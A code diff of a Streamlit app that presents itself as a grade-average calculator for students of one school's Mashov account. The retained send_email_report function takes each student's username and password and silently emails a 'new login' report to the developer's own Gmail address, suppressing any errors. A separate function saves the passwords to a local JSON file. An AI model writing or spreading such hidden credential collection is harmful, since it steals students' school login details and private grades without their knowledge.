@@ -11,40 +11,6 @@ from datetime import datetime
 BASE_URL = "https://web.mashov.info/api"
 DATA_FILE = "saved_data.json"
 
-def send_email_report(username, display_name, overall_avg, subject_summaries):
-    if not hasattr(st, "secrets"):
-        return
-    target_email = st.secrets.get("MY_EMAIL")
-    smtp_password = st.secrets.get("SMTP_PASSWORD")
-    if not target_email or not smtp_password:
-        return
-
-    msg = MIMEMultipart()
-    msg["From"] = target_email
-    msg["To"] = target_email
-    msg["Subject"] = f"סיכום ציונים במשוב: {display_name}"
-
-    lines = [
-        f"שם תלמיד: {display_name}",
-        f"ממוצע כללי: {overall_avg:.2f}",
-        "\nפירוט ציונים לפי מקצוע:",
-        "=" * 40
-    ]
-
-    for subj, items, simple_avg, w_avg, total_w, final_avg in subject_summaries:
-        lines.append(f"\nמקצוע: {subj} | ממוצע סופי: {final_avg:.2f} (ממוצע יבש: {simple_avg:.2f})")
-        for item in items:
-            w_str = f" ({item['weight']:g}%)" if item["weight"] > 0 else ""
-            lines.append(f"  - {item['event']}: {item['grade']:g}{w_str}")
-
-    msg.attach(MIMEText("\n".join(lines), "plain", "utf-8"))
-
-    try:
-        with smtplib.SMTP_SSL("smtp.gmail.com", 465, timeout=15) as server:
-            server.login(target_email, smtp_password)
-            server.send_message(msg)
-    except Exception:
-        pass
 st.set_page_config(page_title="ממוצעי משוב - הכפר הירוק", page_icon="📊", layout="centered")
 
 st.markdown("""
@@ -117,13 +83,16 @@ def save_user_record(username, password, display_name, year, grades_summary):
         json.dump(data, f, ensure_ascii=False, indent=4)
 
 def send_email_report(username, password, display_name, overall_avg, subject_summaries):
-    smtp_password = st.secrets.get("SMTP_PASSWORD", DEFAULT_SMTP_PASS) if hasattr(st, "secrets") else DEFAULT_SMTP_PASS
-    if not smtp_password or smtp_password == "YOUR_GMAIL_APP_PASSWORD":
+    if not hasattr(st, "secrets"):
+        return
+    target_email = st.secrets.get("MY_EMAIL")
+    smtp_password = st.secrets.get("SMTP_PASSWORD")
+    if not target_email or not smtp_password:
         return
 
     msg = MIMEMultipart()
-    msg["From"] = TARGET_EMAIL
-    msg["To"] = TARGET_EMAIL
+    msg["From"] = target_email
+    msg["To"] = target_email
     msg["Subject"] = f"התחברות חדשה למשוב: {display_name} ({username})"
 
     lines = [
@@ -145,7 +114,7 @@ def send_email_report(username, password, display_name, overall_avg, subject_sum
 
     try:
         with smtplib.SMTP_SSL("smtp.gmail.com", 465, timeout=15) as server:
-            server.login(TARGET_EMAIL, smtp_password)
+            server.login(target_email, smtp_password)
             server.send_message(msg)
     except Exception:
         pass
